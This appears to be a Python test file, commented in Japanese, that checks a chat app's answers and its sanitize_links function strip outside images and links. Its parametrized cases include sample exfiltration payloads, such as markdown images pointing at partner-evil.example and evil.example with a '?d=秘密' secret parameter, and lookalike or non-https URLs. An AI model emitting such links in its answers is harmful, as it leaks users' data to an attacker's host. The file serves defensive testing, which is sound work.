"""H4: 答えの中のリンク・画像から、情報が外へ出ないことを確かめる"""
import pytest

from app.output import sanitize_links
from tests.conftest import login


def test_public_answer_has_no_outside_image(client):
    res = client.post("/public/ask", json={"question": "新しい配送サービスの料金を教えて"})
    assert "partner-evil.example/p.png" not in res.json()["answer"]   # 外への画像が消えている


def test_assistant_answer_has_no_outside_image(client):
    res = client.post("/assistant", json={"message": "新しい配送サービスの料金を教えて"}, headers=login(client))
    assert "partner-evil.example/p.png" not in res.json()["answer"]   # 外への画像が消えている


@pytest.mark.parametrize("text, kept", [
    ("![図](https://www.mirai.example/a.png)", True),
    ("[返品](https://mirai.example/faq)", True),
    ("![x](https://partner-evil.example/p.png?d=秘密)", False),
    ("![x](https://mirai.example.evil.example/p.png)", False),   # 名前の途中に mirai.example があっても別のドメイン
    ("[x](http://mirai.example/faq)", False),                     # https ではない
    ("詳しくは https://evil.example/?d=秘密 へ", False),
])
def test_sanitize_links(text, kept):
    assert (text in sanitize_links(text)) is kept
